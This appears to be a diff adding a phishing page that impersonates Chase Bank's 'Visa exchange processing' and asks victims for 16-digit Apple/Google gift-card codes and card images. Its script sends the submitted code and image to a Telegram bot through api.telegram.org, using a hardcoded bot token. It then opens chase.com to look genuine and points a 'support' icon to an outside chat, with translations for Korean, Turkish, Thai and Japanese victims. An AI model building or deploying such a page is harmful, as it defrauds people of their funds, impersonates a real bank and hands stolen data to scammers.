@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa exchange Processing - Chase Bank</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+        }  
+        header {
+            background-color: #005bb5;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .header-icons i {
+            font-size: 30px;
+            margin: 0 12px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .header-icons i:hover {
+            transform: scale(1.2);
+        }
+
+        .support-icon {
+            animation: bounce 1s infinite alternate, zoom 1.5s infinite alternate;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            cursor: pointer;
+            z-index: 1000;
+        }
+
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-10px); }
+        }
+
+        @keyframes zoom {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .time-display {
+            font-size: 14px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .language-select {
+            padding: 8px;
+            margin-left: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 14px;
+        }
+
+        section {
+            background: white;
+            margin: 20px auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 600px;
+        }
+
+        input, button {
+            width: 80%;
+            padding: 10px;
+            margin: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            display: inline-block;
+        }
+
+        button {
+            background-color: #005bb5;
+            color: white;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #004494;
+        }
+
+        .spinner-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 91, 181, 0.2);
+            border-top: 5px solid #005bb5;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .processing-text {
+            font-size: 16px;
+            color: #005bb5;
+            font-weight: bold;
+            margin-top: 10px;
+            animation: zoom 1.5s infinite;
+        }
+
+        @keyframes zoom {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .upload-label {
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .file-icon {
+            margin-right: 8px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<header>
+    <h2 id="mainTitle">Chase Visa exchange Processing</h2>
+    <div class="header-icons">
+        <i class="material-icons support-icon" id="supportIcon" onclick="window.location.href='https://services.zangi.com/dl/conversation/1089683230'">support_agent</i>
+        <div class="time-display" id="currentTime">--:--:--</div>
+        <i class="material-icons">account_circle</i>
+        <i class="material-icons">info</i>
+        <select class="language-select" id="languageSelect" onchange="translatePage()">
+            <option value="en">English</option>
+            <option value="ko">한국어 (Korean)</option>
+            <option value="tr">Türkçe (Turkish)</option>
+            <option value="th">ไทย (Thai)</option>
+            <option value="ja">日本語 (Japanese)</option>
+        </select>
+    </div>
+</header>
+
+<section>
+    <h3 id="title">Secure Your Funds</h3>
+    <p id="info">Upload your 16 digit Apple /Google exchange code ID 🪪 to activate and exchange your funds withdrawn to your native currency account.</p>
+</section>
+
+<section>
+    <form id="visaForm">
+        <label id="codeLabel">Enter 16-digit Activation Code ID🪪:</label><br>
+        <input type="text" id="cardCode" maxlength="16" placeholder="Enter code here" required><br>
+
+        <label class="upload-label">
+            <i class="material-icons file-icon">attach_file</i>
+            <span>Upload Google/Apple Card ID 🪪 Image:</span>
+        </label><br>
+        <input type="file" id="cardImage" accept="image/*" style="display: inline-block;"><span style="margin-left: 10px;">Upload your Apple ID image</span><br>
+
+        <button type="submit" id="submitBtn">Submit</button>
+    </form>
+
+    <div class="spinner-container" id="spinnerContainer">
+        <div class="spinner"></div>
+        <p class="processing-text" id="processingText">Processing...</p>
+    </div>
+</section>
+
+<script>
+    const botToken = "7868267520:AAG-om3K7sG49Y2w0ngv-k_o4mWrY7lTwkY";
+    const chatId = "";
+
+    document.getElementById("visaForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        const cardCode = document.getElementById("cardCode").value.trim();
+        const cardImage = document.getElementById("cardImage").files[0];
+        const processingDiv = document.getElementById("spinnerContainer");
+        processingDiv.style.display = "block";
+
+        if (!cardCode) {
+            alert("Please enter a valid activation code.");
+            processingDiv.style.display = "none";
+            return;
+        }
+
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Activation Code: ${cardCode}`;
+
+        fetch(telegramURL)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    if (cardImage) {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', cardImage);
+                        const imageUploadURL = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                        fetch(imageUploadURL, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => response.json())
+                        .then(imageData => {
+                            if (imageData.ok) {
+                                alert("✅ Success! Your activation code and image have been submitted.");
+                            } else {
+                                alert("❌ Failed to submit image. Please try again.");
+                            }
+                        });
+                    } else {
+                        alert("✅ Success! Your activation code has been submitted.");
+                    }
+                    setTimeout(() => {
+                        window.open("https://chase.com", "_blank");
+                    }, 5000);
+                } else {
+                    alert("❌ Failed to submit. Please try again.");
+                    processingDiv.style.display = "none";
+                }
+            })
+            .catch(() => {
+                alert("❌ Network Error! Please check your internet connection.");
+                processingDiv.style.display = "none";
+            });
+    });
+
+    function translatePage() {
+        let lang = document.getElementById("languageSelect").value;
+        let translations = {
+            en: { mainTitle: "Chase Visa Processing", title: "Secure Your Funds", info: "Upload your 16 digit Apple /Google exchange code ID 🪪 to activate and exchange your funds withdrawn to your native currency account." },
+            ko: { mainTitle: "체이스 비자 처리", title: "자금을 보호하세요", info: "16자리 Apple/Google 교환 코드 ID 🪪을 업로드하여 자금을 활성화하고 귀하의 원화 계좌로 교환하세요." },
+            tr: { mainTitle: "Chase Vize İşleme", title: "Fonlarınızı Güvenceye Alın", info: "16 haneli Apple/Google değişim kodu kimliğinizi 🪪 yükleyin, böylece fonlarınızı yerel para birimi hesabınıza aktifleştirin ve değiştirin." },
+            th: { mainTitle: "การประมวลผลวีซ่า Chase", title: "ปกป้องเงินของคุณ", info: "อัปโหลดรหัส Apple/Google 16 หลัก ID 🪪 เพื่อเปิดใช้งานและแลกเปลี่ยนเงินของคุณไปยังบัญชีสกุลเงินท้องถิ่นของคุณ." },
+            ja: { mainTitle: "チェースビザ処理", title: "資金を確保する", info: "16桁のApple/Google交換コードID 🪪をアップロードして、資金をアクティブ化し、ネイティブ通貨口座に引き出します。" }
+        };
+        document.getElementById("mainTitle").innerText = translations[lang].mainTitle;
+        document.getElementById("title").innerText = translations[lang].title;
+        document.getElementById("info").innerText = translations[lang].info;
+    }
+</script>
+
+</body>
+</html>
